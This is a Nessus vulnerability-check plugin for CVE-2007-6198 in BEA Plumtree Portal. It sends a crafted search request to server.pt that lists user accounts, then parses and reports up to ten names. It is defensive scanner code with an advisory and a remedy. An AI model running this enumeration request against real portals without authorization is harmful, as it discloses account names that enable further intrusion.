#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(29187);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2007-6198");
  script_bugtraq_id(26620);
  script_osvdb_id(41876);

  script_name(english:"Plumtree Portal User Object User Enumeration");
  script_summary(english:"Searches for Plumtree portal user objects");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application affected by an
information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of the Plumtree portal included with BEA AquaLogic
Interaction / Plumtree Foundation and installed on the remote host
allows an attacker to obtain a list of users defined to the portal
through its search facility.  This may aide in further attacks against
the affected application." );
 # https://web.archive.org/web/20080908084124/http://procheckup.com/Vulnerability_PR06-11.php
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d66de917" );
 script_set_attribute(attribute:"see_also", value:"http://dev2dev.bea.com/pub/advisory/254" );
 script_set_attribute(attribute:"solution", value:
"Edit object security and set access privilege to 'None' for Guest or
Everyone user accounts as discussed in the vendor advisory above." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/12/04");
 script_cvs_date("$Date: 2017/04/25 14:31:39 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);

search = "*";
max_results = 10;


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/portal", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue.
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/server.pt?",
      "in_ra_groupoperator_1=and&",
      "in_hi_userid=1&",
      "in_hi_req_objtype=1&",          # 1 => Users object type
      "space=SearchResult&",
      "in_tx_fulltext=", search, "&",
      "in_hi_groupoperator_1=and&",
      "parentid=1&",
      "in_hi_req_apps=1&",
      "cached=false&",
      "control=advancedstart&",
      "in_hi_revealed_1=0&",
      "in_hi_req_page=", max_results, "&",
      "in_hi_depth_1=0&",
      "in_hi_totalgroups=1&",
      "parentname=AdvancedSearch&",
      "in_ra_topoperator=and" ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we found some users.

  if (
    '="ReorganizeResults"' >< res &&
    '<b>Users</b>' >< res &&
    (
      'One result from your search' >< res ||
      'Results from your search:' >< res
    )
  )
  {
    info = "";
    nusers = 0;

    form = strstr(res, '="ReorganizeResults"') - '="ReorganizeResults"';
    form = form - strstr(form, "</form>");

    pat = '<a href="[^>]+><b>([^<]+)<.+<span[^>]+>(<i>)?([^<]+)';
    matches = egrep(pattern:pat, string:form);
    if (matches)
    {
      foreach match (split(matches))
      {
        match = chomp(match);
        val = eregmatch(pattern:pat, string:match);
        # nb: ignore pseudo-accounts.
        if (!isnull(val) && val[1] !~ "^(Default Profile|Guest|Nobody)$")
        {
          nusers++;

          user = val[1];
          summary = val[3];
          summary = str_replace(find:"&nbsp;", replace:" ", string:summary);

          info += '  - ' + user + '\n' +
                  '    ' + summary + '\n' +
                  '\n';
        }
      }
    }

    if (info)
    {
      report = string(
        "\n",
        "Here is a list of Plumtree Portal users defined to the remote host and\n",
        "discovered by searching for User objects matching '", search, "' :\n",
        "\n",
        info
      );
      if (nusers >= max_results)
        report = string(
          report,
          "\n",
          "Note that there may actually be more users, but Nessus limited\n",
          "the search to ", max_results, " results.\n"
        );

        security_warning(port:port, extra:report);
        exit(0);
    }
  }
}
